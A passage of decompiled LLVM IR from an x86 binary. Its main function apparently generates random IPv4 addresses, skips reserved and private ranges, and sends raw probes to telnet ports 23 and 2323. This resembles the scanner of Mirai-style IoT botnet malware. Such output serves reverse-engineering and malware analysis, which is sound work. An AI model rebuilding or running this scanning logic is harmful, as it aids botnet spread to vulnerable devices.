  store i32 %v0_804f800, i32* @ebx, align 4
  ret i32 %v0_804f8c7

; uselistorder directives
  uselistorder i32 %v3_804f826, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8051ce0, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804f83a, { 1, 0 }
}

define i32 @function_8050071() local_unnamed_addr {
dec_label_pc_8050071:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_80505a1

dec_label_pc_80505a1:                             ; preds = %dec_label_pc_805058b, %dec_label_pc_8050071
  %v0_8050071 = load i32, i32* @global_var_8056930.34, align 16
  store i32 %v0_8050071, i32* @esi, align 4
  %v0_8050077 = load i32, i32* @esp, align 4
  %v1_8050077 = add i32 %v0_8050077, 24
  %v2_8050077 = inttoptr i32 %v1_8050077 to i32*
  %v3_8050077 = load i32, i32* %v2_8050077, align 4
  %v15_8050077 = icmp eq i32 %v3_8050077, %v0_8050071
  br i1 %v15_8050077, label %dec_label_pc_8050330, label %dec_label_pc_8050081

dec_label_pc_8050081:                             ; preds = %dec_label_pc_80505a1
  %v1_8050081 = add i32 %v0_8050077, 1828
  store i32 %v1_8050081, i32* @ebp, align 4
  %v1_8050088 = add i32 %v0_8050077, 1868
  %v2_8050088 = inttoptr i32 %v1_8050088 to i32*
  store i32 0, i32* %v2_8050088, align 4
  %v0_8050236.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050236

dec_label_pc_8050098:                             ; preds = %dec_label_pc_80502aa
  %v11_8050098 = icmp eq i8 %v2_805028d, -84
  br i1 %v11_8050098, label %dec_label_pc_80502f5, label %dec_label_pc_80500a1

dec_label_pc_80500a1:                             ; preds = %dec_label_pc_8050098
  %v10_80500a1 = icmp eq i8 %v2_805028d, 100
  br i1 %v10_80500a1, label %dec_label_pc_80500a1.dec_label_pc_80502c1_crit_edge, label %dec_label_pc_80500aa

dec_label_pc_80500a1.dec_label_pc_80502c1_crit_edge: ; preds = %dec_label_pc_80500a1
  %.pre = trunc i32 %v2_8050284 to i8
  br label %dec_label_pc_80502c1

dec_label_pc_80500aa:                             ; preds = %dec_label_pc_80502b8, %dec_label_pc_80500a1
  %v11_80500aa = icmp eq i8 %v2_805028d, -87
  br i1 %v11_80500aa, label %dec_label_pc_8050310, label %dec_label_pc_80500b3

dec_label_pc_80500b3:                             ; preds = %dec_label_pc_8050307, %dec_label_pc_80500aa
  %v0_80500b3 = phi i32 [ %v0_8050307, %dec_label_pc_8050307 ], [ %v5_8050282, %dec_label_pc_80500aa ]
  %v0_805013b69 = phi i32 [ %v0_80502fe, %dec_label_pc_8050307 ], [ %v2_8050284, %dec_label_pc_80500aa ]
  %v1_80500b3 = trunc i32 %v0_80500b3 to i8
  %v11_80500b3 = icmp eq i8 %v1_80500b3, -58
  br i1 %v11_80500b3, label %dec_label_pc_80502d8, label %dec_label_pc_80500bc

dec_label_pc_80500bc:                             ; preds = %dec_label_pc_8050310, %dec_label_pc_80502cf, %dec_label_pc_80500b3
  %v0_80500bc = phi i32 [ %v0_80500bc76, %dec_label_pc_8050310 ], [ %v5_8050282, %dec_label_pc_80502cf ], [ %v0_80500b3, %dec_label_pc_80500b3 ]
  %v0_805013b68 = phi i32 [ %v0_8050310, %dec_label_pc_8050310 ], [ %v2_8050284, %dec_label_pc_80502cf ], [ %v0_805013b69, %dec_label_pc_80500b3 ]
  %v1_80500bc = trunc i32 %v0_80500bc to i8
  %tmp283 = icmp ult i8 %v1_80500bc, -32
  br i1 %tmp283, label %dec_label_pc_80500c5, label %dec_label_pc_8050277.preheader

dec_label_pc_80500c5:                             ; preds = %dec_label_pc_80502c1, %dec_label_pc_80502f5.dec_label_pc_80500c5_crit_edge, %dec_label_pc_80502e1, %dec_label_pc_80500bc, %dec_label_pc_80502d8
  %v0_805013b = phi i32 [ %v0_80502fe, %dec_label_pc_80502f5.dec_label_pc_80500c5_crit_edge ], [ %v0_80502e1, %dec_label_pc_80502e1 ], [ %v0_805013b68, %dec_label_pc_80500bc ], [ %v0_80502e1, %dec_label_pc_80502d8 ], [ %v2_8050284, %dec_label_pc_80502c1 ]
  %v0_8050149 = phi i32 [ %v0_80500c5.pre, %dec_label_pc_80502f5.dec_label_pc_80500c5_crit_edge ], [ %v0_80500c565, %dec_label_pc_80502e1 ], [ %v0_80500bc, %dec_label_pc_80500bc ], [ %v0_80500c565, %dec_label_pc_80502d8 ], [ %v5_8050282, %dec_label_pc_80502c1 ]
  %v1_80500c5 = add i32 %v0_8050149, -6
  store i32 %v1_80500c5, i32* %eax.global-to-local, align 4
  %v1_80500c8 = trunc i32 %v1_80500c5 to i8
  %tmp284 = or i8 %v1_80500c8, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500d0

dec_label_pc_80500d0:                             ; preds = %dec_label_pc_80500c5
  %v1_80500d0 = trunc i32 %v0_8050149 to i8
  %v10_80500d0 = icmp eq i8 %v1_80500d0, 11
  br i1 %v10_80500d0, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500d9

dec_label_pc_80500d9:                             ; preds = %dec_label_pc_80500d0
  %v10_80500d9 = icmp eq i8 %v1_80500d0, 21
  br i1 %v10_80500d9, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500e2

dec_label_pc_80500e2:                             ; preds = %dec_label_pc_80500d9
  %v10_80500e2 = icmp eq i8 %v1_80500d0, 22
  br i1 %v10_80500e2, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500eb

dec_label_pc_80500eb:                             ; preds = %dec_label_pc_80500e2
  %v10_80500eb = icmp eq i8 %v1_80500d0, 26
  br i1 %v10_80500eb, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500f4

dec_label_pc_80500f4:                             ; preds = %dec_label_pc_80500eb
  %v10_80500f4 = icmp eq i8 %v1_80500d0, 28
  br i1 %v10_80500f4, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500fd

dec_label_pc_80500fd:                             ; preds = %dec_label_pc_80500f4
  %v10_80500fd = icmp eq i8 %v1_80500d0, 29
  br i1 %v10_80500fd, label %dec_label_pc_8050277.preheader, label %dec_label_pc_8050106

dec_label_pc_8050106:                             ; preds = %dec_label_pc_80500fd
  %v10_8050106 = icmp eq i8 %v1_80500d0, 30
  br i1 %v10_8050106, label %dec_label_pc_8050277.preheader, label %dec_label_pc_805010f

dec_label_pc_805010f:                             ; preds = %dec_label_pc_8050106
  %v10_805010f = icmp eq i8 %v1_80500d0, 33
  br i1 %v10_805010f, label %dec_label_pc_8050277.preheader, label %dec_label_pc_8050118

dec_label_pc_8050118:                             ; preds = %dec_label_pc_805010f
  %v10_8050118 = icmp eq i8 %v1_80500d0, 55
  br i1 %v10_8050118, label %dec_label_pc_8050277.preheader, label %dec_label_pc_8050121

dec_label_pc_8050121:                             ; preds = %dec_label_pc_8050118
  %v11_8050121 = icmp eq i8 %v1_80500d0, -42
  br i1 %v11_8050121, label %dec_label_pc_8050277.preheader, label %dec_label_pc_805012a

dec_label_pc_805012a:                             ; preds = %dec_label_pc_8050121
  %v11_805012a = icmp eq i8 %v1_80500d0, -41
  br i1 %v11_805012a, label %dec_label_pc_8050277.preheader, label %dec_label_pc_8050133

dec_label_pc_8050133:                             ; preds = %dec_label_pc_805012a
  %v0_8050135 = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805690a.35 to i16*), align 4
  %v1_805013b = mul i32 %v0_805013b, 65536
  %v2_8050146 = and i32 %v1_805013b, 16711680
  %v2_8050149 = mul i32 %v0_8050149, 16777216
  %v1_8050135 = mul i32 %v0_8050135, 256
  %v2_805014f = or i32 %v2_8050146, %v2_8050149
  %v0_8050151 = load i32, i32* @edi, align 4
  %v1_8050153 = urem i32 %v0_8050151, 256
  store i32 %v1_8050153, i32* %eax.global-to-local, align 4
  %v2_8050158 = or i32 %v1_8050153, %v2_805014f
  store i32 %v2_8050158, i32* %ecx.global-to-local, align 4
  %v2_805015a = or i32 %v1_8050153, %v1_8050135
  %v1_805015c = load i32, i32* @esp, align 4
  %v2_805015c = add i32 %v1_805015c, -4
  %v3_805015c = inttoptr i32 %v2_805015c to i32*
  store i32 %v2_8050158, i32* %v3_805015c, align 4
  %v1_805015d = trunc i32 %v2_805015a to i16
  %v2_805015d = call i16 @llvm.bswap.i16(i16 %v1_805015d)
  %v3_805015d = zext i16 %v2_805015d to i32
  %v1_8050161 = udiv i32 %v2_805014f, 65536
  %v2_8050161 = mul nuw i32 %v3_805015d, 65536
  %v1_8050164 = trunc i32 %v1_8050161 to i16
  %v2_8050164 = call i16 @llvm.bswap.i16(i16 %v1_8050164)
  %v3_8050164 = zext i16 %v2_8050164 to i32
  %v6_8050164 = or i32 %v2_8050161, %v3_8050164
  store i32 %v6_8050164, i32* %edx.global-to-local, align 4
  %v0_8050168 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050168 = add i32 %v1_805015c, -8
  %v3_8050168 = inttoptr i32 %v2_8050168 to i32*
  store i32 %v0_8050168, i32* %v3_8050168, align 4
  %v0_8050169 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050169, i32* @global_var_8056910.36, align 16
  %v1_805016f = add i32 %v1_805015c, -12
  %v2_805016f = inttoptr i32 %v1_805016f to i32*
  store i32 20, i32* %v2_805016f, align 4
  %v1_8050171 = add i32 %v1_805015c, -16
  %v2_8050171 = inttoptr i32 %v1_8050171 to i32*
  store i32 ptrtoint (i32* @global_var_8056900.37 to i32), i32* %v2_8050171, align 4
  %v0_8050176 = call i32 @function_804d4b0()
  %v1_8050176 = trunc i32 %v0_8050176 to i16
  store i32 %v0_8050176, i32* %eax.global-to-local, align 4
  %v0_805017b = load i32, i32* @esp, align 4
  %v1_805017b = add i32 %v0_805017b, 1884
  %v2_805017b = inttoptr i32 %v1_805017b to i32*
  %v3_805017b = load i32, i32* %v2_805017b, align 4
  store i16 %v1_8050176, i16* bitcast (i32* @global_var_805690a.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_8050191 = ashr i32 %v3_805017b, 31
  %v2_8050197 = zext i32 %v3_805017b to i64
  %v4_8050197 = zext i32 %v2_8050191 to i64
  %v5_8050197 = mul nuw i64 %v4_8050197, 4294967296
  %v6_8050197 = or i64 %v5_8050197, %v2_8050197
  %v10_8050197 = srem i64 %v6_8050197, 10
  %v11_8050197 = trunc i64 %v10_8050197 to i32
  store i32 %v11_8050197, i32* %edx.global-to-local, align 4
  %v1_8050199 = icmp eq i32 %v11_8050197, 0
  %v1_805019b = icmp eq i1 %v1_8050199, false
  %. = select i1 %v1_805019b, i16 5888, i16 4873
  store i16 %., i16* @global_var_8056916.38, align 2
  %v0_80501aa = load i32, i32* @global_var_8056910.36, align 16
  store i32 %v0_80501aa, i32* %eax.global-to-local, align 4
  %v1_80501af = add i32 %v0_805017b, 12
  %v2_80501af = inttoptr i32 %v1_80501af to i32*
  store i32 20, i32* %v2_80501af, align 4
  %v0_80501b1 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80501b1, i32* @global_var_8056918.39, align 8
  %v1_80501b6 = add i32 %v0_805017b, 8
  %v2_80501b6 = inttoptr i32 %v1_80501b6 to i32*
  store i32 5120, i32* %v2_80501b6, align 4
  store i16 0, i16* bitcast (i32* @global_var_8056924.40 to i16*), align 4
  %v1_80501c4 = add i32 %v0_805017b, 4
  %v2_80501c4 = inttoptr i32 %v1_80501c4 to i32*
  store i32 ptrtoint (i32* @global_var_8056914.41 to i32), i32* %v2_80501c4, align 4
  %v2_80501c9 = inttoptr i32 %v0_805017b to i32*
  store i32 ptrtoint (i32* @global_var_8056900.37 to i32), i32* %v2_80501c9, align 4
  %v0_80501ce = call i32 @function_804d500()
  %v1_80501ce = trunc i32 %v0_80501ce to i16
  store i16 %v1_80501ce, i16* bitcast (i32* @global_var_8056924.40 to i16*), align 4
  %v0_80501d9 = load i32, i32* @global_var_8056910.36, align 16
  store i32 %v0_80501d9, i32* %eax.global-to-local, align 4
  %v1_80501de = load i32, i32* @esp, align 4
  %v2_80501de = add i32 %v1_80501de, 1848
  %v3_80501de = inttoptr i32 %v2_80501de to i32*
  store i32 %v0_80501d9, i32* %v3_80501de, align 4
  %v0_80501e5 = load i16, i16* @global_var_8056916.38, align 2
  %v1_80501e5 = zext i16 %v0_80501e5 to i32
  %v2_80501e5 = load i32, i32* %eax.global-to-local, align 4
  %v3_80501e5 = and i32 %v2_80501e5, -65536
  %v4_80501e5 = or i32 %v3_80501e5, %v1_80501e5
  store i32 %v4_80501e5, i32* %eax.global-to-local, align 4
  %v0_80501eb = load i32, i32* @esp, align 4
  %v1_80501eb = add i32 %v0_80501eb, 1844
  %v2_80501eb = inttoptr i32 %v1_80501eb to i16*
  store i16 2, i16* %v2_80501eb, align 2
  %v0_80501f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501f5 = trunc i32 %v0_80501f5 to i16
  %v2_80501f5 = load i32, i32* @esp, align 4
  %v3_80501f5 = add i32 %v2_80501f5, 1846
  %v4_80501f5 = inttoptr i32 %v3_80501f5 to i16*
  store i16 %v1_80501f5, i16* %v4_80501f5, align 2
  %v0_80501fd = load i32, i32* @esp, align 4
  %v1_80501fd = inttoptr i32 %v0_80501fd to i32*
  %v3_80501fd = add i32 %v0_80501fd, 4
  %v0_80501fe = load i32, i32* @global_var_805697c.42, align 4
  store i32 %v0_80501fe, i32* %eax.global-to-local, align 4
  %v1_8050203 = inttoptr i32 %v3_80501fd to i32*
  %v2_8050203 = load i32, i32* %v1_8050203, align 4
  store i32 %v2_8050203, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_8050203, align 4
  %v0_8050206 = load i32, i32* @ebp, align 4
  store i32 %v0_8050206, i32* %v1_80501fd, align 4
  %v1_8050207 = add i32 %v0_80501fd, -4
  %v2_8050207 = inttoptr i32 %v1_8050207 to i32*
  store i32 16384, i32* %v2_8050207, align 4
  %v1_805020c = add i32 %v0_80501fd, -8
  %v2_805020c = inttoptr i32 %v1_805020c to i32*
  store i32 40, i32* %v2_805020c, align 4
  %v1_805020e = add i32 %v0_80501fd, -12
  %v2_805020e = inttoptr i32 %v1_805020e to i32*
  store i32 ptrtoint (i32* @global_var_8056900.37 to i32), i32* %v2_805020e, align 4
  %v0_8050213 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050213 = add i32 %v0_80501fd, -16
  %v3_8050213 = inttoptr i32 %v2_8050213 to i32*
  store i32 %v0_8050213, i32* %v3_8050213, align 4
  %v0_8050214 = call i32 @function_8052967()
  store i32 %v0_8050214, i32* %eax.global-to-local, align 4
  %v0_8050219 = load i32, i32* @esp, align 4
  %v1_8050219 = add i32 %v0_8050219, 1900
  %v2_8050219 = inttoptr i32 %v1_8050219 to i32*
  %v3_8050219 = load i32, i32* %v2_8050219, align 4
  %v1_8050220 = add i32 %v3_8050219, 1
  store i32 %v1_8050220, i32* %eax.global-to-local, align 4
  store i32 %v1_8050220, i32* %v2_8050219, align 4
  %v0_8050228 = load i32, i32* @esp, align 4
  %v1_8050228 = add i32 %v0_8050228, 32
  %v0_805022b = load i32, i32* %eax.global-to-local, align 4
  %v1_805022b = add i32 %v0_805022b, -383
  %v6_805022b = sub i32 382, %v0_805022b
  %v7_805022b = and i32 %v6_805022b, %v0_805022b
  %v8_805022b = icmp slt i32 %v7_805022b, 0
  %v9_805022b = icmp eq i32 %v1_805022b, 0
  %v10_805022b = icmp slt i32 %v1_805022b, 0
  %v3_8050230 = icmp eq i1 %v10_805022b, %v8_805022b
  %v4_8050230 = icmp eq i1 %v9_805022b, false
  %v5_8050230 = and i1 %v4_8050230, %v3_8050230
  br i1 %v5_8050230, label %dec_label_pc_805032c, label %dec_label_pc_8050236

dec_label_pc_8050236:                             ; preds = %dec_label_pc_8050133, %dec_label_pc_8050081
  %v0_8050236 = phi i32 [ %v1_8050228, %dec_label_pc_8050133 ], [ %v0_8050236.pre, %dec_label_pc_8050081 ]
  %v1_8050236 = add i32 %v0_8050236, 1828
  %v2_8050236 = inttoptr i32 %v1_8050236 to i32*
  store i32 0, i32* %v2_8050236, align 4
  %v0_8050241 = load i32, i32* @esp, align 4
  %v1_8050241 = add i32 %v0_8050241, 1832
  %v2_8050241 = inttoptr i32 %v1_8050241 to i32*
  store i32 0, i32* %v2_8050241, align 4
  %v0_805024c = load i32, i32* @esp, align 4
  %v1_805024c = add i32 %v0_805024c, 1836
  %v2_805024c = inttoptr i32 %v1_805024c to i32*
  store i32 0, i32* %v2_805024c, align 4
  %v0_8050257 = load i32, i32* @esp, align 4
  %v1_8050257 = add i32 %v0_8050257, 1840
  %v2_8050257 = inttoptr i32 %v1_8050257 to i32*
  store i32 0, i32* %v2_8050257, align 4
  %v1_8050262 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_8050262 = trunc i32 %v1_8050262 to i16
  store i16 %v2_8050262, i16* bitcast (i32* @global_var_8056904.43 to i16*), align 4
  %v0_805026d = load i32, i32* @global_var_805695c.27, align 4
  store i32 %v0_805026d, i32* %eax.global-to-local, align 4
  store i32 %v0_805026d, i32* @global_var_805690c.44, align 4
  br label %dec_label_pc_8050277.preheader

dec_label_pc_8050277.preheader:                   ; preds = %dec_label_pc_8050236, %dec_label_pc_80500c5, %dec_label_pc_80500d0, %dec_label_pc_80500d9, %dec_label_pc_80500e2, %dec_label_pc_80500eb, %dec_label_pc_80500f4, %dec_label_pc_80500fd, %dec_label_pc_8050106, %dec_label_pc_805010f, %dec_label_pc_8050118, %dec_label_pc_8050121, %dec_label_pc_805012a, %dec_label_pc_80502e1, %dec_label_pc_80502fe, %dec_label_pc_80500bc, %dec_label_pc_8050310
  br label %dec_label_pc_8050277

dec_label_pc_8050277:                             ; preds = %dec_label_pc_80502ca, %dec_label_pc_80502b3, %dec_label_pc_80502a5, %dec_label_pc_80502a0, %dec_label_pc_8050299, %dec_label_pc_8050295, %dec_label_pc_8050291, %dec_label_pc_8050277, %dec_label_pc_8050277.preheader
  %v1_8050277 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050277, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_8050277, 65536
  %v1_805027c = sdiv i32 %sext, 65536
  %v2_8050282 = urem i32 %v1_8050277, 256
  %v3_8050282 = load i32, i32* @ecx, align 4
  %v4_8050282 = and i32 %v3_8050282, -256
  %v5_8050282 = or i32 %v4_8050282, %v2_8050282
  store i32 %v5_8050282, i32* @ecx, align 4
  %v2_8050284 = udiv i32 %v1_805027c, 256
  store i32 %v2_8050284, i32* @ebx, align 4
  %v2_8050287 = udiv i32 %v1_805027c, 65536
  store i32 %v2_8050287, i32* @edx, align 4
  %v2_805028a = udiv i32 %v1_805027c, 16777216
  store i32 %v2_805028a, i32* @edi, align 4
  %v2_805028d = trunc i32 %v1_8050277 to i8
  %v11_805028d = icmp eq i8 %v2_805028d, 127
  br i1 %v11_805028d, label %dec_label_pc_8050277, label %dec_label_pc_8050291

dec_label_pc_8050291:                             ; preds = %dec_label_pc_8050277
  %v6_8050291 = icmp eq i8 %v2_805028d, 0
  br i1 %v6_8050291, label %dec_label_pc_8050277, label %dec_label_pc_8050295

dec_label_pc_8050295:                             ; preds = %dec_label_pc_8050291
  %v11_8050295 = icmp eq i8 %v2_805028d, 3
  br i1 %v11_8050295, label %dec_label_pc_8050277, label %dec_label_pc_8050299

dec_label_pc_8050299:                             ; preds = %dec_label_pc_8050295
  %v2_8050299 = add nsw i32 %v1_805027c, -15
  store i32 %v2_8050299, i32* %eax.global-to-local, align 4
  %v1_805029c = trunc i32 %v2_8050299 to i8
  %tmp286 = or i8 %v1_805029c, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_8050277, label %dec_label_pc_80502a0

dec_label_pc_80502a0:                             ; preds = %dec_label_pc_8050299
  %v10_80502a0 = icmp eq i8 %v2_805028d, 56
  br i1 %v10_80502a0, label %dec_label_pc_8050277, label %dec_label_pc_80502a5

dec_label_pc_80502a5:                             ; preds = %dec_label_pc_80502a0
  %v10_80502a5 = icmp eq i8 %v2_805028d, 10
  br i1 %v10_80502a5, label %dec_label_pc_8050277, label %dec_label_pc_80502aa

dec_label_pc_80502aa:                             ; preds = %dec_label_pc_80502a5
  %v8_80502aa = icmp eq i8 %v2_805028d, -64
  %v1_80502ad = icmp eq i1 %v8_80502aa, false
  br i1 %v1_80502ad, label %dec_label_pc_8050098, label %dec_label_pc_80502b3

dec_label_pc_80502b3:                             ; preds = %dec_label_pc_80502aa
  %v1_80502b3 = trunc i32 %v2_8050284 to i8
  %v11_80502b3 = icmp eq i8 %v1_80502b3, -88
  br i1 %v11_80502b3, label %dec_label_pc_8050277, label %dec_label_pc_80502b8

dec_label_pc_80502b8:                             ; preds = %dec_label_pc_80502b3
  %v10_80502b8 = icmp eq i8 %v2_805028d, 100
  %v1_80502bb = icmp eq i1 %v10_80502b8, false
  br i1 %v1_80502bb, label %dec_label_pc_80500aa, label %dec_label_pc_80502c1

dec_label_pc_80502c1:                             ; preds = %dec_label_pc_80500a1.dec_label_pc_80502c1_crit_edge, %dec_label_pc_80502b8
  %v1_80502c1.pre-phi = phi i8 [ %.pre, %dec_label_pc_80500a1.dec_label_pc_80502c1_crit_edge ], [ %v1_80502b3, %dec_label_pc_80502b8 ]
  %tmp288 = icmp ult i8 %v1_80502c1.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_80500c5, label %dec_label_pc_80502ca

dec_label_pc_80502ca:                             ; preds = %dec_label_pc_80502c1
  %tmp289 = icmp ult i8 %v1_80502c1.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_8050277, label %dec_label_pc_80502cf

dec_label_pc_80502cf:                             ; preds = %dec_label_pc_80502ca
  %v11_80502cf = icmp eq i8 %v2_805028d, -58
  %v1_80502d2 = icmp eq i1 %v11_80502cf, false
  br i1 %v1_80502d2, label %dec_label_pc_80500bc, label %dec_label_pc_80502d8

dec_label_pc_80502d8:                             ; preds = %dec_label_pc_80502cf, %dec_label_pc_80500b3
  %v0_80502e1 = phi i32 [ %v2_8050284, %dec_label_pc_80502cf ], [ %v0_805013b69, %dec_label_pc_80500b3 ]
  %v0_80500c565 = phi i32 [ %v5_8050282, %dec_label_pc_80502cf ], [ %v0_80500b3, %dec_label_pc_80500b3 ]
  %v1_80502d8 = trunc i32 %v0_80502e1 to i8
  %tmp290 = icmp ult i8 %v1_80502d8, 18
  br i1 %tmp290, label %dec_label_pc_80500c5, label %dec_label_pc_80502e1

dec_label_pc_80502e1:                             ; preds = %dec_label_pc_80502d8
  %tmp291 = or i8 %v1_80502d8, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_8050277.preheader, label %dec_label_pc_80500c5

dec_label_pc_80502eb:                             ; preds = %dec_label_pc_8051095
  store i32 0, i32* %v2_80502ee, align 4
  %v1_80502f0 = call i32 @function_8053d39(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80502f0, i32* %eax.global-to-local, align 4
  %v0_80502f5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80502f5

dec_label_pc_80502f5:                             ; preds = %dec_label_pc_8050098, %dec_label_pc_80502eb
  %v0_80502fe = phi i32 [ %v0_80502f5.pre, %dec_label_pc_80502eb ], [ %v2_8050284, %dec_label_pc_8050098 ]
  %v1_80502f5 = trunc i32 %v0_80502fe to i8
  %tmp293 = icmp ult i8 %v1_80502f5, 16
  br i1 %tmp293, label %dec_label_pc_80502f5.dec_label_pc_80500c5_crit_edge, label %dec_label_pc_80502fe

dec_label_pc_80502f5.dec_label_pc_80500c5_crit_edge: ; preds = %dec_label_pc_80502f5
  %v0_80500c5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80500c5

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_80502f5
  %tmp294 = icmp ult i8 %v1_80502f5, 32
  br i1 %tmp294, label %dec_label_pc_8050277.preheader, label %dec_label_pc_8050307

dec_label_pc_8050307:                             ; preds = %dec_label_pc_80502fe
  %v0_8050307 = load i32, i32* @ecx, align 4
  %v1_8050307 = trunc i32 %v0_8050307 to i8
  %v11_8050307 = icmp eq i8 %v1_8050307, -87
  %v1_805030a = icmp eq i1 %v11_8050307, false
  br i1 %v1_805030a, label %dec_label_pc_80500b3, label %dec_label_pc_8050310

dec_label_pc_8050310:                             ; preds = %dec_label_pc_8050307, %dec_label_pc_80500aa
  %v0_80500bc76 = phi i32 [ %v0_8050307, %dec_label_pc_8050307 ], [ %v5_8050282, %dec_label_pc_80500aa ]
  %v0_8050310 = phi i32 [ %v0_80502fe, %dec_label_pc_8050307 ], [ %v2_8050284, %dec_label_pc_80500aa ]
  %v1_8050310 = trunc i32 %v0_8050310 to i8
  %v11_8050310 = icmp eq i8 %v1_8050310, -1
  %v1_8050313 = icmp eq i1 %v11_8050310, false
  br i1 %v1_8050313, label %dec_label_pc_80500bc, label %dec_label_pc_8050277.preheader

dec_label_pc_805032c:                             ; preds = %dec_label_pc_8050133
  %v0_805032c = load i32, i32* @esi, align 4
  %v2_805032c = add i32 %v0_8050228, 56
  %v3_805032c = inttoptr i32 %v2_805032c to i32*
  store i32 %v0_805032c, i32* %v3_805032c, align 4
  br label %dec_label_pc_8050330

dec_label_pc_8050330:                             ; preds = %dec_label_pc_80505a1, %dec_label_pc_805032c
  %v1_8050330 = call i32 @function_8052729(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050330, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050337 = load i32, i32* @esp, align 4
  %v2_8050337 = add i32 %v1_8050337, 40
  %v3_8050337 = inttoptr i32 %v2_8050337 to i32*
  store i32 %v1_8050330, i32* %v3_8050337, align 4
  br label %dec_label_pc_805033b

dec_label_pc_805033b:                             ; preds = %dec_label_pc_80503d8, %dec_label_pc_80503d0, %dec_label_pc_80503c8, %dec_label_pc_80503c0, %dec_label_pc_80503b4, %dec_label_pc_80503a8, %dec_label_pc_80503a1, %dec_label_pc_805038f, %dec_label_pc_8050383, %dec_label_pc_805037e, %dec_label_pc_805043a, %dec_label_pc_8050330
  %v0_805033b = load i32, i32* @esp, align 4
  %v1_805033b = add i32 %v0_805033b, 40
  %v2_805033b = inttoptr i32 %v1_805033b to i32*
  %v3_805033b = load i32, i32* %v2_805033b, align 4
  store i32 %v3_805033b, i32* %eax.global-to-local, align 4
  %v1_805033f = inttoptr i32 %v3_805033b to i32*
  store i32 0, i32* %v1_805033f, align 4
  %v0_8050345 = load i32, i32* @edi, align 4
  %v1_8050345 = load i32, i32* @esp, align 4
  %v2_8050345 = add i32 %v1_8050345, -4
  %v3_8050345 = inttoptr i32 %v2_8050345 to i32*
  store i32 %v0_8050345, i32* %v3_8050345, align 4
  %v0_8050346 = load i32, i32* @edi, align 4
  %v2_8050346 = add i32 %v1_8050345, -8
  %v3_8050346 = inttoptr i32 %v2_8050346 to i32*
  store i32 %v0_8050346, i32* %v3_8050346, align 4
  %v1_8050347 = add i32 %v1_8050345, -12
  %v2_8050347 = inttoptr i32 %v1_8050347 to i32*
  store i32 0, i32* %v2_8050347, align 4
  %v1_8050349 = add i32 %v1_8050345, -16
  %v2_8050349 = inttoptr i32 %v1_8050349 to i32*
  store i32 0, i32* %v2_8050349, align 4
  %v1_805034b = add i32 %v1_8050345, -20
  %v2_805034b = inttoptr i32 %v1_805034b to i32*
  store i32 16384, i32* %v2_805034b, align 4
  %v1_8050350 = add i32 %v1_8050345, -24
  %v2_8050350 = inttoptr i32 %v1_8050350 to i32*
  store i32 1514, i32* %v2_8050350, align 4
  %v0_8050355 = load i32, i32* @global_var_805697c.42, align 4
  store i32 %v0_8050355, i32* %esi.global-to-local, align 4
  %v1_805035b = add i32 %v1_8050345, 58
  store i32 %v1_805035b, i32* %edx.global-to-local, align 4
  %v2_805035f = add i32 %v1_8050345, -28
  %v3_805035f = inttoptr i32 %v2_805035f to i32*
  store i32 %v1_805035b, i32* %v3_805035f, align 4
  %v0_8050360 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050360 = add i32 %v1_8050345, -32
  %v3_8050360 = inttoptr i32 %v2_8050360 to i32*
  store i32 %v0_8050360, i32* %v3_8050360, align 4
  %v0_8050361 = call i32 @function_80528f1()
  store i32 %v0_8050361, i32* %eax.global-to-local, align 4
  %v0_8050366 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_8050361, 1
  br i1 %tmp, label %dec_label_pc_8050450, label %dec_label_pc_8050371

dec_label_pc_8050371:                             ; preds = %dec_label_pc_805033b
  %v1_8050371 = add i32 %v0_8050366, 72
  %v2_8050371 = inttoptr i32 %v1_8050371 to i32*
  %v3_8050371 = load i32, i32* %v2_8050371, align 4
  store i32 %v3_8050371, i32* %ecx.global-to-local, align 4
  %v1_8050375 = inttoptr i32 %v3_8050371 to i32*
  %v2_8050375 = load i32, i32* %v1_8050375, align 4
  %v11_8050375 = icmp eq i32 %v2_8050375, 11
  br i1 %v11_8050375, label %dec_label_pc_8050450, label %dec_label_pc_805037e

dec_label_pc_805037e:                             ; preds = %dec_label_pc_8050371
  %tmp295 = icmp ult i32 %v0_8050361, 40
  br i1 %tmp295, label %dec_label_pc_805033b, label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_805037e
